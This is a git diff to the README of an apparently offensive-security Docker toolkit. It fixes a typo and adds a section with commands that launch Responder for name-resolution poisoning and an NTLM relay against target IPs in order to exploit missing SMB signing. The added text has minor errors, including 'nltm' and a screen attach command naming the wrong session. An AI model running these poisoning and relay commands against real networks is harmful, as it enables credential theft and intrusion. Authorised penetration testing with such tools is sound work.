@@ -48,7 +48,7 @@ docker run --rm -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
 zap_vuln_scan https://yourtarget.com/
 ```
 
-To run Zap against a list of URLs, place the urls in file named urls.txt in the `PWD`with each url
+To run Zap against a list of URLs, place the urls in file named urls.txt in the `PWD` with each url
 on a new line (the last line must be terminated with a new line). Run:
 
 ```bash
@@ -125,6 +125,31 @@ You can interact with the above screen with the command:
 ```
 screen -r ipv6_relay
 ```
+
+### Exploit SMB signing not required via DNS poisioning and NTLM relay.
+
+```bash
+
+screen -S responder -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
+start_responder local_network_interface
+```
+
+You can interact with the above screen with the command:
+```
+screen -r responder
+```
+
+```bash
+screen -S ipv4_relay -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
+start_nltm_relay_ipv4 target_ip_address_or_list_of_ips
+```
+
+You can interact with the above screen with the command:
+
+```
+screen -r ipv6_relay
+```
+
 ### Checking for and exploit null SMB Sessions
 
 ```bash
